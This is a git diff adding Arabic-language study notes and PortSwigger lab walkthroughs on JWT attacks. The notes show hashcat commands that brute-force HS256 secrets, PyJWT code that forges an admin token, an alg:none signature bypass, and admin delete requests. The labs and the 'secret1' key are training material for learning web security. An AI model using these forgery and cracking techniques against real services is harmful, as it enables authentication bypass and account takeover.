@@ -186,6 +186,114 @@
 
 
 
+- <details>
+    <summary>JWT Attacks - Brute-forcing Secret Keys</summary>
+    
+    # JWT Attacks - Brute-forcing Secret Keys
+    
+    ## الفكرة الأساسية
+    - بعض خوارزميات التوقيع مثل **HS256 (HMAC + SHA-256)** تعتمد على **secret key** (سلسلة نصية عشوائية).
+    - لو الـ secret ضعيف أو قابل للتخمين (زي كلمة مرور ضعيفة)، المهاجم يقدر يعمل:
+      - إنشاء JWT بأي header و payload.
+      - إعادة التوقيع باستخدام الـ secret المخمَّن.
+      - الحصول على توقيع صحيح وبالتالي تزوير الـ JWT.
+    
+    ---
+    
+    ## أخطاء شائعة من المطورين
+    - نسيان تغيير الـ default/placeholder secret.
+    - نسخ كود من الإنترنت ونسيان تعديل الـ hardcoded secret.
+    - استخدام أسرار ضعيفة أو مشهورة.
+    
+    ---
+    
+    ## أداة Brute-force: Hashcat
+    - **Hashcat** بيستخدم لمهاجمة مفاتيح JWT بسرعة.
+    - موجود مسبقًا في **Kali Linux**.
+    - لازم يكون عندك:
+      - JWT صالح (موقَّع من السيرفر).
+      - wordlist فيها أسرار معروفة.
+    
+    ---
+    
+    ## الأمر المستخدم
+    ```bash
+    hashcat -a 0 -m 16500 <jwt> <wordlist>
+    ```
+
+    https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
+    
+    - ``-a 0`` → هجوم dictionary.
+    
+    - ``-m 16500`` → مود JWT HS256.
+    
+    - ``<jwt>`` → التوكن الهدف.
+    
+    - ``<wordlist>`` → قائمة .
+    
+    
+    #### النتيجة
+    
+    > Hashcat بيجرب كل secret من الـ wordlist.
+    
+    لو لقى مطابقة، هيطبع بالشكل:
+    
+    ```ruby
+    <jwt>:<identified-secret>
+    ```
+    
+    لو شغلت الأمر أكتر من مرة، لازم تضيف:
+    
+    ```
+    --show
+    ```
+    
+    
+    ```
+    hashcat -a 0 -m 16500 <jwt> /usr/share/seclists/Passwords/JWT/jwt.secrets.list
+    ```
+    ---
+    
+    <details>
+    
+    ```
+    python3 jwt_tool.py <jwt> -S hs256 -k <secret>
+    ```
+    
+    ```python
+    import jwt
+    
+    payload = {"username": "attacker", "role": "admin"}
+    secret = "the_secret_you_found"
+    
+    token = jwt.encode(payload, secret, algorithm="HS256")
+    print(token)
+    ```
+    
+    
+    
+        
+    </details>
+
+
+  </details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -266,6 +374,97 @@ eyJraWQiOiI4MWIxYTBiYy01NWNlLTRjOTAtYTE1Yi02ZTY0MzM1MTljNTAiLCJhbGciOiJSUzI1NiJ9
 
   
 </details>
+
+
+
+<details>
+    <summary>Lab: JWT authentication bypass via flawed signature verification</summary>
+
+1. login as **`wiener : peter`**
+
+<img width="747" height="613" alt="image" src="https://github.com/user-attachments/assets/49400493-6f82-4b6d-84ae-7872076d755e" />
+
+> change **`algo`** to `none` and remove the signeture and change **``carlos``** to **``administrator``**
+
+<img width="1505" height="731" alt="image" src="https://github.com/user-attachments/assets/6a59e0d7-bc8b-4d6c-bb91-b314fa9d88d4" />
+
+
+> now change **`path`** to :
+
+```http
+GET /admin/delete?username=carlos HTTP/2
+```
+
+<img width="1505" height="734" alt="image" src="https://github.com/user-attachments/assets/4de7a1c3-ea34-4b8a-9a49-40a2b1d2d401" />
+
+    
+</details>
+
+
+
+
+
+
+
+<details>
+    <summary>Lab: JWT authentication bypass via weak signing key</summary>
+
+
+```
+eyJraWQiOiIwNjhlY2JkYy00YzQ2LTRlOWItODc5Zi02Y2QyZWVhNjNiZDAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjQyNDM0OCwic3ViIjoid2llbmVyIn0.c0YlOr9HLbE0Xuso36umnu2wiOsGd2BzArlCXI3_60M
+```
+
+<img width="742" height="614" alt="image" src="https://github.com/user-attachments/assets/45651d25-d4f7-434e-99d5-9667d0c0bcdb" />
+
+
+```
+hashcat -a 0 -m 16500 eyJraWQiOiIwNjhlY2JkYy00YzQ2LTRlOWItODc5Zi02Y2QyZWVhNjNiZDAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjQyNDM0OCwic3ViIjoid2llbmVyIn0.c0YlOr9HLbE0Xuso36umnu2wiOsGd2BzArlCXI3_60M /usr/share/seclists/Passwords/scraped-JWT-secrets.txt
+```
+
+<img width="1374" height="273" alt="image" src="https://github.com/user-attachments/assets/f9e1cded-604e-47a2-834f-157ba0aba4c7" />
+
+```
+secret1
+```
+
+<img width="1546" height="745" alt="image" src="https://github.com/user-attachments/assets/09176375-61b2-4e35-9181-8eab68b53d87" />
+
+> now change **`path`** to :
+
+```http
+GET /admin/delete?username=carlos HTTP/2
+```
+
+<img width="1492" height="649" alt="image" src="https://github.com/user-attachments/assets/87127834-aeb3-4d22-b683-7c305bc7849e" />
+
+
+
+
+    
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
